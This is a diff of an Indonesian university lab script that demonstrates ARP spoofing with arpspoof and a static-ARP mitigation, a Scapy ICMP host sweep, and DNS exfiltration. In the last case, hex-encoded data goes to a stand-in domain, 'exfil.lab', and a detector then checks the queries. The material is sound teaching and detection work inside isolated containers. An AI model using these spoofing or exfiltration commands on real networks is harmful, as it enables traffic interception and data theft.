@@ -57,23 +57,36 @@ case "${1:-}" in
   docker run -d --name gateway-k10   --network lab-arp-k10 --cap-add NET_ADMIN uts-kali-tools >/dev/null
   docker run -d --name penyerang-k10 --network lab-arp-k10 --cap-add NET_ADMIN uts-kali-tools >/dev/null
   sleep 3
-  IP_KORBAN=$(docker inspect -f '{{.NetworkSettings.Networks.lab-arp-k10.IPAddress}}' korban-k10)
-  IP_GW=$(docker inspect -f '{{.NetworkSettings.Networks.lab-arp-k10.IPAddress}}' gateway-k10)
+  # Perhatikan sintaks `index`: nama network mengandung tanda hubung, dan
+  # Go template Docker menolak '-' di dalam {{.a.b-nama}}, jadi harus pakai
+  # {{(index .NetworkSettings.Networks "lab-arp-k10").IPAddress}}.
+  IP_KORBAN=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k10").IPAddress}}' korban-k10)
+  IP_GW=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k10").IPAddress}}' gateway-k10)
   MAC_GW=$(docker exec gateway-k10 cat /sys/class/net/eth0/address)
   echo "korban=$IP_KORBAN   gateway=$IP_GW   mac_gateway=$MAC_GW"
   echo
-  echo "--- 1. SEBELUM (baseline) ---"
-  docker exec korban-k10 ip neigh show
+  # Entry ARP baru terbentuk setelah ada trafik. Ping gateway dulu, kalau tidak
+  # tabel ARP korban masih kosong dan tidak ada yang bisa dibandingkan.
+  echo "--- 0. bikin entry ARP muncul (ping gateway) ---"
+  # Bersihkan sisa entry static dari run sebelumnya. Entry PERMANENT sengaja
+  # tidak bisa ditimpa ARP reply, jadi kalau tidak dihapus, langkah 2 akan
+  # terlihat "gagal" padahal arpspoof-nya bekerja.
+  docker exec korban-k10 ip neigh del "$IP_GW" dev eth0 2>/dev/null
+  docker exec korban-k10 ping -c 2 "$IP_GW" > /dev/null 2>&1
+  echo "--- 1. SEBELUM (baseline: MAC gateway BENAR) ---"
+  docker exec korban-k10 ip neigh show "$IP_GW"
   echo
-  echo "--- 2. SAAT DISERANG (MAC gateway harus berubah) ---"
+  echo "--- 2. SAAT DISERANG (MAC gateway harus berubah jadi milik penyerang) ---"
   docker exec -d penyerang-k10 timeout 20 arpspoof -i eth0 -t "$IP_KORBAN" "$IP_GW" 2>/dev/null \
     || echo "(arpspoof tidak tersedia — lihat catatan di PANDUAN-UTS.md)"
   sleep 4
-  docker exec korban-k10 ip neigh show
+  docker exec korban-k10 ip neigh show "$IP_GW"
+  echo "   mac gateway asli : $MAC_GW"
+  echo "   mac penyerang    : $(docker exec penyerang-k10 cat /sys/class/net/eth0/address)"
   echo
-  echo "--- 3. SETELAH MITIGASI (static ARP, harus PERMANENT) ---"
+  echo "--- 3. SETELAH MITIGASI (static ARP, harus PERMANENT + MAC asli) ---"
   docker exec korban-k10 ip neigh replace "$IP_GW" lladdr "$MAC_GW" nud permanent dev eth0
-  docker exec korban-k10 ip neigh show
+  docker exec korban-k10 ip neigh show "$IP_GW"
   ;;
 
 4)
@@ -87,21 +100,28 @@ case "${1:-}" in
 
 5)
   hr "KASUS 5 — ICMP dengan Scapy"
-  IP_KORBAN=$(docker inspect -f '{{.NetworkSettings.Networks.lab-arp-k10.IPAddress}}' korban-k10 2>/dev/null) \
+  IP_KORBAN=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k10").IPAddress}}' korban-k10 2>/dev/null) \
     || { echo "!! container korban-k10 belum ada — jalankan kasus 3 dulu"; exit 1; }
   echo "--- 5a. kirim ICMP echo request ---"
   docker run --rm --network lab-arp-k10 -v "$PWD/lab/kasus/k5-scapy:/work" uts-kali-tools \
     python3 /work/kirim_icmp.py "$IP_KORBAN"
   echo
-  echo "--- 5b. sweep subnet (perhatikan nilai TTL di atas untuk laporan) ---"
+  echo "--- 5b. sweep host di network ini ---"
+  # Network Docker di sini subnetnya /16, jadi jangan scan seluruh subnet:
+  # 65536 alamat akan menggantung berjam-jam. Ambil daftar IP container yang
+  # benar-benar ada di network ini, lalu scan hanya alamat itu.
   SUBNET=$(docker network inspect lab-arp-k10 -f '{{range .IPAM.Config}}{{.Subnet}}{{end}}')
+  HOSTS=$(docker network inspect lab-arp-k10 -f '{{range .Containers}}{{.IPv4Address}} {{end}}' \
+          | tr ' ' '\n' | grep -v '^$' | cut -d/ -f1 | paste -sd, -)
   echo "subnet: $SUBNET"
+  echo "host yang discan: $HOSTS"
   docker run --rm --network lab-arp-k10 uts-kali-tools python3 -c "
 from scapy.all import ICMP, IP, sr
-ans, _ = sr(IP(dst='$SUBNET')/ICMP(), timeout=3, verbose=False)
+targets = '$HOSTS'.split(',')
+ans, _ = sr(IP(dst=targets)/ICMP(), timeout=3, verbose=False)
 print('Host hidup:')
 for sent, recv in ans:
-    print('   ', recv.src, 'ttl=', recv[IP].ttl)
+    print('   ', recv.src, 'ttl=', recv[IP].ttl, 'type=', recv[ICMP].type)
 "
   ;;
 
@@ -125,15 +145,43 @@ for sent, recv in ans:
   hr "KASUS 7 — DNS exfiltration"
   docker-compose -p $PROJ -f lab/b/b4-dns-exfil/docker-compose.yml up -d
   sleep 4
-  echo "--- 1. encode NIM jadi hex ---"; echo "$NIM -> $HEX"
-  echo "--- 2. kirim lewat query DNS (tanpa respons = normal) ---"
+
+  # PENTING: label hex dari NIM 11 digit hanya 22 karakter, sedangkan ambang
+  # detektor di analisis_dns.py adalah >30 karakter — jadi NIM saja TIDAK akan
+  # terdeteksi sebagai mencurigakan. Itu wajar: exfiltration nyata membawa data
+  # besar, bukan satu NIM.
+  #
+  # CATATAN TEKNIS (bahan jawaban bagus): satu label DNS maksimal 63 karakter.
+  # Hex 83 karakter ditolak dig dengan "label too long". Jadi payload dipecah:
+  #   (a) NIM saja (22 char, di bawah ambang -> tidak kena)
+  #   (b) potongan payload (46 char, di atas ambang DAN <=63 -> kena)
+  PAYLOAD="rahasia-nilai-uts-k10"
+  HEX_PAYLOAD=$(echo -n "$PAYLOAD" | xxd -p)
+
+  echo "--- 1. encode jadi hex ---"
+  echo "NIM saja   : $NIM"
+  echo "  -> hex   : $HEX   (panjang label: $(echo -n $HEX | wc -c))"
+  echo "payload    : $PAYLOAD"
+  echo "  -> hex   : $HEX_PAYLOAD   (panjang label: $(echo -n $HEX_PAYLOAD | wc -c))"
+
+  echo
+  echo "--- 2. kirim kedua payload lewat query DNS ---"
+  echo "  query (a) NIM saja (22 char, tidak kena ambang):"
   docker-compose -p $PROJ -f lab/b/b4-dns-exfil/docker-compose.yml exec -T attacker \
     dig +short "$HEX.k10.exfil.lab" @dns
+  echo "  query (b) payload ($(echo -n $HEX_PAYLOAD | wc -c) char, kena ambang):"
+  docker-compose -p $PROJ -f lab/b/b4-dns-exfil/docker-compose.yml exec -T attacker \
+    dig +short "$HEX_PAYLOAD.k10.exfil.lab" @dns
+
+  echo
   echo "--- 3. log resolver + deteksi label mencurigakan ---"
   docker-compose -p $PROJ -f lab/b/b4-dns-exfil/docker-compose.yml logs dns > dns-k10.log
   python3 lab/kasus/k9-dns-detect/analisis_dns.py dns-k10.log
-  echo "--- 4. decode kembali (harus jadi $NIM) ---"
-  echo "$HEX" | xxd -r -p
+
+  echo
+  echo "--- 4. decode kembali ---"
+  echo -n "  query (a) NIM     : "; echo "$HEX" | xxd -r -p; echo
+  echo -n "  query (b) payload : "; echo "$HEX_PAYLOAD" | xxd -r -p; echo
   ;;
 
 clean)
